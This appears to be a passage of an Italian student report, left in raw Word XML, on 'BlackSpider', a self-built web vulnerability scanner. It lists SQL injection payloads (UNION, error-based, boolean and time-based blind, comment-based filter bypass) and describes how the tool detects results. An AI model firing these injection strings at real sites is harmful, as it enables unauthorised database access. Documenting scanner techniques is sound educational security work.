    <w:p w14:paraId="60C56652" w14:textId="09C0E32A" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>2.2 UNION-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>based</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQL Injection</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Questa tecnica sfrutta UNION per recuperare dati aggiuntivi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36801913" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>' UNION SELECT 1,2,3 --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4990BE58" w14:textId="2F6DA33D" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">2.3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Error-based</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> SQL Injection</w:t>
      </w:r>
      <w:r w:rsidR="001247A9" w:rsidRPr="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Funzioni come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>extractvalue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>updatexml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> provocano errori informativi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69046305" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t xml:space="preserve">' AND </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>extractvalue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t xml:space="preserve">(1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>concat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>(0x7e, (SELECT version()))) --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525E4E01" w14:textId="77777777" w:rsidR="001247A9" w:rsidRPr="001247A9" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">2.4 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Boolean-based</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Blind</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0726773A" w14:textId="7E7B1194" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Testano la differenza di comportamento tra condizioni vere e false:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8DE927" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>' AND 1=1 --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12365F67" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>' AND 1=2 --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7407AB32" w14:textId="5C8B423F" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>2.5 Time-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>based</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Blind</w:t>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Iniettano ritardi come:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A93F60" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>' AND SLEEP(1) --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471A9608" w14:textId="7CDD70BC" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2.6 Filter Bypass Techniques</w:t>
      </w:r>
      <w:r w:rsidR="001247A9" w:rsidRPr="001247A9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:t>Utilizzano</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:t>commenti</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:t>tecniche</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:t xml:space="preserve"> evasive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A77218D" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>/*!50000select*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AFC79C" w14:textId="279215A2" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:color w:val="FFFFFF" w:themeColor="background1"/>
          <w:highlight w:val="black"/>
        </w:rPr>
        <w:t>'/**/OR/**/1=1--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00899CE5" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>3. Metodologia di Rilevamento</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A549BEA" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>SQL Injection</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Il sistema utilizza espressioni regolari per catturare messaggi di errore tipici dei database (MySQL, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>PostgreSQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>, Oracle, ecc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEE259E" w14:textId="77777777" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Puppeteer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> cerca nel DOM la comparsa di elementi come &lt;div id='</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>-ok'&gt; o messaggi come “XSS ESEGUITO”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0179975E" w14:textId="560348C0" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Inoltre, combina test sui parametri più comuni (id, user, page, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>, ecc.) con quelli già presenti nell’URL, per massimizzare la copertura.</w:t>
      </w:r>
      <w:r w:rsidR="005353AF">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Oltre ai vari attacchi sono state realizzate delle funzionalità che rendono l’applicazione più efficiente nella gestione delle richieste:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6BC0CE" w14:textId="77777777" w:rsidR="005353AF" w:rsidRDefault="00B61AC0" w:rsidP="001247A9">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ripete i test in caso di problemi di rete, con </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>backoff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> esponenziale per evitare di sovraccaricare il server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6432198F" w14:textId="77777777" w:rsidR="005353AF" w:rsidRDefault="00B61AC0" w:rsidP="001247A9">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Le vulnerabilità trovate vengono classificate in base alla tipologia (es. XSS base, XSS DOM, SQL union, ecc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B0A141" w14:textId="1A525921" w:rsidR="00B61AC0" w:rsidRPr="001247A9" w:rsidRDefault="00B61AC0" w:rsidP="001247A9">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Imposta ritardi tra le richieste e gestisce HTTPS, anche con certificati </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>autofirmati</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001247A9">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> in ambienti di test.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ABDD53F" w14:textId="28B4F132" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Questo strumento è pensato per </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>scopi educativi e di ricerca</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>penetration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> test autorizzati, audit di sicurezza interna e formazione.</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
        <w:t>Non copre ancora alcune vulnerabilità come XSS persistente (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>stored</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">), injection </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>stacked</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> queries o vulnerabilità di secondo ordine, ma l’architettura modulare permette di aggiungere facilmente nuove tecniche e payload.</w:t>
      </w:r>
      <w:r w:rsidR="005353AF">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Alcuni tra i possibili sviluppi futuri sono l’integrazione con scanner già esistenti, come ad esempio ZAP, creazione di un sistema automatico di monitoraggio ed infine l’implementazione di scansioni per nuove vulnerabilità come ad esempio: </w:t>
      </w:r>
      <w:r w:rsidR="005353AF" w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r w:rsidR="005353AF">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r w:rsidR="005353AF" w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>XXE</w:t>
      </w:r>
      <w:r w:rsidR="005353AF">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="005353AF">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Con</w:t>
      </w:r>
      <w:r w:rsidR="005353AF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>BlackSpider</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>, ho cercato di realizzare uno strumento utile e intuitivo, in grado di testare automaticamente queste vulnerabilità e fornire un punto di partenza per un’analisi più approfondita. Il mio intento iniziale era quello di creare uno strumento semplice da utilizzare dall’utente finale, per comprendere in poco tempo quanto un sito web è sicuro.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4DB110" w14:textId="4E296F72" w:rsidR="00B61AC0" w:rsidRPr="00B61AC0" w:rsidRDefault="00B61AC0" w:rsidP="00B61AC0">
      <w:pPr>
        <w:spacing w:after="200" w:line="276" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">La scelta di utilizzare </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>React</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> per il </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>frontend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Node.js</w:t>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> per il </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>backend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> deriva dalla volontà di lavorare con tecnologie moderne e flessibili, che mi hanno permesso di integrare facilmente la logica di scansione e la presentazione dei risultati.</w:t>
      </w:r>
      <w:r w:rsidR="005353AF">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00B61AC0">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>In conclusione, questo progetto non solo ha rappresentato un’importante esperienza pratica nello sviluppo software, ma anche un’occasione per comprendere più a fondo i principi fondamentali della sicurezza informatica e le tecniche per mitigarne i rischi.</w:t>
      </w:r>
    </w:p>
